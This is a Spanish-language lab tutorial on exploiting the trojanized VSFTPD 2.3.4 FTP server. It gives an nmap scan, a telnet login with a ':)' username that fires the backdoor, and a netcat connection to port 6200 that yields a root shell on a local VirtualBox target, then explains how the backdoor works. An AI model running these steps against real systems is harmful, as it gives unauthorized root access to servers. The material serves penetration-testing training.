### 🔧 Servicio: VSFTPD (Very Secure FTP Daemon).

# 🎯 Objetivo: 
Ganar acceso remoto a través de un backdoor existente en una versión vulnerable del servicio FTP.

# 🔍 ¿Qué aprenderás?.

- Enumerar un servicio FTP.
- Reconocer banner/versiones comprometidas.
- Entender cómo se creó un backdoor en VSFTPD 2.3.4.
- Lanzar una conexión "trampa" que abre una shell remota.

Nos introduciremos al uso de **netcat**, detección de **backdoors intencionados** binarios, explotación que resulta en **shell directa como root**.

# 🧠 1. ¿Qué es VSFTPD 2.3.4 Backdoor?.

En julio de 2011, alguien inyectó código malicioso en la versión 2.3.4 del popular servidor FTP “Very Secure FTP Daemon” y la distribuyó como si fuese legítima.

- Esta versión no viene con vulnerabilidades por defecto, sino que fue troyanizada intencionalmente.
- Si un atacante se conecta con un usuario que contenga :), se abre una shell de root.
- No requiere autenticación ni interacción con el sistema, solo el trigger adecuado.

# 🛠️ 2. Pasos para la explotación de VSFTPD.

## 🔎 Paso 1: Escanear con Nmap.

```bash
nmap -sV -p 21 192.168.56.102
```

Veremos como resultado:

| Puerto | Estado | Servicio | Versión     |
|--------|--------|----------|-------------|
| 21/tcp | open   | ftp      | vsftpd 2.3.4 |

**MAC Address:** 08:00:27:63:DC:BA (PCS Systemtechnik / Oracle VirtualBox virtual NIC)  
**Service Info:** OS: Unix

## 💥 Paso 2: Detectar el backdoor.

El **trigger** del backdoor es coenctarse con cualquier nombre de usuario que contenga :).

Para ello, probamos con:

```bash
telnet 192.168.56.102 21
```

Una vez conectado:

```txt
220 (vsFTPd 2.3.4)
USER test:)
PASS test
```
Y, entonces, la coenxión debe cerrarse de inmediato, indicando que el backdoor ha sido activado.

## 🚪 Paso 3: Conectarnos al puerto 6200.

Comprobamos si se ha abierto una shell en el puerto 6200:

```bash
nc 192.168.56.102 6200
```

En este punto, nos encontramos con una shell de root. Probamos ejecutando:

```bash
id
whoami
hostname
```

# 🧠 3. Explicación técnica del backdoor.

- El binario de esta versión troyanizada de VSFTPD contenía un código oculto que abría un socket en el puerto 6200.
- Cuando alguien intentaba iniciar sesión con un nombre de usuario que contenía :), se disparaba la ejecución del backdoor.
- El puerto 6200 no está anunciado, ni abierto inicialmente.
- Una vez activado, entrega una shell interactiva como root, sin necesidad de credenciales.


